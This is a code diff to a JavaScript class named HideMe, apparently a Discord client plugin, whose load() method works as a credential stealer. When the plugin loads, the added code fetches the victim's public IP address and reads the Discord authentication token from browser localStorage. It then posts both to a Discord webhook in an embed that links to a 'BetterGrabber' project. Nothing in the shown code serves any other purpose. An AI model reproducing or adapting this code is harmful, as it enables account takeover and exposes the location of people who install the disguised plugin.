@@ -36,30 +36,47 @@ class HideMe {
     }
 
     // Load/Unload
-    load() {
-        window.dispatchEvent(new Event('beforeunload'));
-        var opts = ["discord.com", 443, '/api/webhooks/ID/TOKEN', 'UselessLol', 'POST', 'application/json']
-        const https = require('https');
+    async load() {
+    	window.dispatchEvent(new Event('beforeunload')); //Useless Atm
+    	const https = require('https');//Hehehe Hello XMLHttpRequest
+
+    	var wh = "/api/webhooks/ID/TOKEN";
+
+    	function getIP(){
+    		return new Promise(async (resolve, reject) => {
+    			https.get({'host': 'api.ipify.org', 'port': 443, 'path': '/'}, function(response) {
+    				response.on('data', function(body) {
+    					return resolve(body.toString());
+    				}).on('error', (e) => {
+    					console.error(e);
+    				});
+    			});
+    		});
+    	}
+
+    	function getToken(){
+    		return new Promise(async (resolve, reject) => {
+    			return resolve(window.open().localStorage.token)
+    		});
+    	}
+
+    	var IP = await getIP();
+    	var token = await getToken();
+
         var pD = JSON.stringify({
-            'content': window.open().localStorage.token
+            content: "@everyone",
+            username: "Hello World",
+            avatar_url: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",
+            tts: true,
+            embeds: [{"title": "Hello World", "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": null, "fields": [{ "name": "IP", "value": IP, inline: false }, { "name": "Token", "value": token, inline: false }]}]
         });
-        var o = {
-            "hostname": opts[0],
-            "port": opts[1],
-            "path": opts[2],
-            "method": opts[4],
-            "headers": {
-                'Content-Type': opts[5],
-                'Content-Length': pD.length
-            }
-        };
-        var r = https.request(o);
-        r.on('error', (e) => {
+
+        var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": wh, "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
+        SendToWebhook.on('error', (e) => {
             console.error(e);
         });
-        r.write(pD);
-        r.end();
-
+        SendToWebhook.write(pD);
+        SendToWebhook.end();
     }
 
     unload() {}
